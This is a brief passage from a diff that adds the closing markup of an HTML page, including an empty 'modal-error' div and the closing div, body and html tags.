+        <div id="modal-error"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+</body>
+</html>
